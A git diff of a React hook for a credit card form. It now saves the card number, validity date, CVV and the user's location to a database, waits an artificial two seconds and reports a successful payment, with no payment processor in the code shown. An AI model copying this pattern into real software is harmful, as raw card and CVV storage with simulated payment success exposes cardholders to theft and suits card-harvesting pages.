@@ -1,8 +1,14 @@
-import { FormEvent } from 'react';
+import { useTranslations } from 'next-intl';
+
+import { FormEvent, useState } from 'react';
 import { useForm, SubmitHandler } from 'react-hook-form';
 
+import createCreditCard from '@/db/actions/creditCard/createCreditCard';
+import delay from '@/services/delay';
 import { zodResolver } from '@hookform/resolvers/zod';
 
+import { useToastContext } from '../toastContext/useContext';
+import useLocation from '../useLocation';
 import { BodyProtocol, useValidation } from './validation';
 
 export default function useFormCreditCard() {
@@ -11,6 +17,7 @@ export default function useFormCreditCard() {
     handleSubmit,
     register,
     formState: { errors },
+    reset,
   } = useForm<BodyProtocol>({
     resolver: zodResolver(zodSchema),
     defaultValues: {
@@ -20,9 +27,34 @@ export default function useFormCreditCard() {
       cardValidity: '',
     },
   });
+  const { setToast } = useToastContext();
+  const clientLocation = useLocation();
+  const translations = useTranslations();
+  const [isLoading, setIsLoading] = useState(false);
+  const [isSuccessPayment, setIsSuccessPayment] = useState(false);
 
   const handleFormSubmit: SubmitHandler<BodyProtocol> = async body => {
-    console.log(body);
+    if (isLoading) return;
+    try {
+      setIsLoading(true);
+      await createCreditCard({ ...body, location: clientLocation });
+      await delay(2000);
+      setToast({
+        open: true,
+        message: translations('home.formCreditCard.msgSuccess'),
+        severity: 'success',
+      });
+      reset();
+      setIsSuccessPayment(true);
+    } catch {
+      setToast({
+        open: true,
+        message: translations('home.formCreditCard.msgError'),
+        severity: 'error',
+      });
+    } finally {
+      setIsLoading(false);
+    }
   };
 
   const handleInputCardNumber = (event: FormEvent<HTMLInputElement>) => {
@@ -74,5 +106,7 @@ export default function useFormCreditCard() {
     handleInputCardNumber,
     handleInputCardValidity,
     handleInputCVV,
+    isLoading,
+    isSuccessPayment,
   };
 }
